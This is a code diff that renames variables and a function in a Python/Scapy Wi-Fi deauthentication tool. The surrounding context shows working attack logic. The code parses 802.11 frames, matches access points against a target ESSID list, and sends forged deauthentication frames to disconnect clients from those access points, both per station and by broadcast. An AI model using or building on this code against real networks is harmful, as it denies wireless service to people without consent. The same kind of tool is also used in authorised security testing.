@@ -111,7 +111,7 @@ def is_unicast(bssid: str) -> bool:
         raise MsgException(e, 'BSSID could not be processed')
     return unicast
 
-def get_src_dst_network(frame: dot11.Dot11) -> tuple[str | None, str | None, str | None]:
+def get_src_dst_net(frame: dot11.Dot11) -> tuple[str | None, str | None, str | None]:
     '''frame control field parsing'''
     
     try:
@@ -121,21 +121,21 @@ def get_src_dst_network(frame: dot11.Dot11) -> tuple[str | None, str | None, str
             bssid_dst = frame.addr3
             if not from_ds:
                 bssid_src = frame.addr2
-                bssid_network = frame.addr1
+                bssid_net = frame.addr1
         else:
             bssid_dst = frame.addr1
             if from_ds:
                 bssid_src = frame.addr3
-                bssid_network = frame.addr2
+                bssid_net = frame.addr2
             else:
                 bssid_src = frame.addr2
-                bssid_network = frame.addr3
+                bssid_net = frame.addr3
     except Exception as e:
         raise MsgException(e, 'Frame Control field could not be processed')
-    return bssid_src, bssid_dst, bssid_network
+    return bssid_src, bssid_dst, bssid_net
 
 def unicast_deauth(deauth_config: DeauthConfig, bssid_sta: str, bssid_ap: str,
-                   bssid_network: str) -> None:
+                   bssid_net: str) -> None:
     '''unicast deauthentication'''
     
     try:
@@ -147,7 +147,7 @@ def unicast_deauth(deauth_config: DeauthConfig, bssid_sta: str, bssid_ap: str,
                         dot11.Dot11(
                             addr1 = bssid_sta,
                             addr2 = bssid_ap,
-                            addr3 = bssid_network,
+                            addr3 = bssid_net,
                         ) /
                         dot11.Dot11Deauth(reason = 7),
                     iface = deauth_config.get_interface(),
@@ -159,7 +159,7 @@ def unicast_deauth(deauth_config: DeauthConfig, bssid_sta: str, bssid_ap: str,
                         dot11.Dot11(
                             addr1 = bssid_ap,
                             addr2 = bssid_sta,
-                            addr3 = bssid_network,
+                            addr3 = bssid_net,
                         ) /
                         dot11.Dot11Deauth(reason = 7),
                     iface = deauth_config.get_interface(),
@@ -178,8 +178,7 @@ def unicast_deauth(deauth_config: DeauthConfig, bssid_sta: str, bssid_ap: str,
     except Exception as e:
         raise MsgException(e, 'Unicast deauthentication frames could not be sent')
 
-def broadcast_deauth(deauth_config: DeauthConfig, bssid_ap: str,
-                     bssid_network: str) -> None:
+def broadcast_deauth(deauth_config: DeauthConfig, bssid_ap: str, bssid_net: str) -> None:
     '''broadcast deauthentication'''
     
     try:
@@ -191,7 +190,7 @@ def broadcast_deauth(deauth_config: DeauthConfig, bssid_ap: str,
                         dot11.Dot11(
                             addr1 = BROADCAST,
                             addr2 = bssid_ap,
-                            addr3 = bssid_network,
+                            addr3 = bssid_net,
                         ) /
                         dot11.Dot11Deauth(reason = 7),
                     iface = deauth_config.get_interface(),
@@ -212,9 +211,9 @@ def handle_beacon_proberesp(frame: dot11.Dot11, deauth_config: DeauthConfig,
     '''beacon and probe-resp frames processing'''
     
     try:
-        bssid_src, bssid_dst, bssid_network = get_src_dst_network(frame)
+        bssid_src, bssid_dst, bssid_net = get_src_dst_net(frame)
         if (
-            bssid_src and bssid_dst and bssid_network and
+            bssid_src and bssid_dst and bssid_net and
             bssid_src not in aps_targetlist and
             bssid_src not in aps_whitelist
         ):
@@ -224,7 +223,7 @@ def handle_beacon_proberesp(frame: dot11.Dot11, deauth_config: DeauthConfig,
                     if dot11_element.info == bytes(aps_targetlist.get_essid(), 'utf-8'):
                         aps_targetlist.add(bssid_src)
                         if deauth_config.get_broadcast():
-                            broadcast_deauth(deauth_config, bssid_src, bssid_network)
+                            broadcast_deauth(deauth_config, bssid_src, bssid_net)
                     break
                 dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
     except Exception as e:
@@ -235,9 +234,9 @@ def handle_probereq(frame: dot11.Dot11, deauth_config: DeauthConfig,
     '''probe-req frames processing'''
     
     try:
-        bssid_src, bssid_dst, bssid_network = get_src_dst_network(frame)
+        bssid_src, bssid_dst, bssid_net = get_src_dst_net(frame)
         if (
-            bssid_src and bssid_dst and bssid_network and
+            bssid_src and bssid_dst and bssid_net and
             is_unicast(bssid_dst) and
             bssid_dst not in aps_targetlist and
             bssid_dst not in aps_whitelist
@@ -248,7 +247,7 @@ def handle_probereq(frame: dot11.Dot11, deauth_config: DeauthConfig,
                     if dot11_element.info == bytes(aps_targetlist.get_essid(), 'utf-8'):
                         aps_targetlist.add(bssid_dst)
                         if deauth_config.get_broadcast():
-                            broadcast_deauth(deauth_config, bssid_dst, bssid_network)
+                            broadcast_deauth(deauth_config, bssid_dst, bssid_net)
                     break
                 dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
     except Exception as e:
@@ -259,21 +258,21 @@ def handle_ctl_data(frame: dot11.Dot11, deauth_config: DeauthConfig,
     '''ctl and data frames processing'''
     
     try:
-        bssid_src, bssid_dst, bssid_network = get_src_dst_network(frame)
-        if bssid_src and bssid_dst and bssid_network:
+        bssid_src, bssid_dst, bssid_net = get_src_dst_net(frame)
+        if bssid_src and bssid_dst and bssid_net:
             if (
                 is_unicast(bssid_dst) and
                 bssid_src in aps_targetlist and
                 stations.get(bssid_dst) != bssid_src
             ):
                 stations.update(bssid_dst, bssid_src)
-                unicast_deauth(deauth_config, bssid_dst, bssid_src, bssid_network)
+                unicast_deauth(deauth_config, bssid_dst, bssid_src, bssid_net)
             elif (
                 bssid_dst in aps_targetlist and
                 stations.get(bssid_src) != bssid_dst
             ):
                 stations.update(bssid_src, bssid_dst)
-                unicast_deauth(deauth_config, bssid_src, bssid_dst, bssid_network)
+                unicast_deauth(deauth_config, bssid_src, bssid_dst, bssid_net)
     except Exception as e:
         raise MsgException(e, 'ctl and/or data frames could not be processed')
 
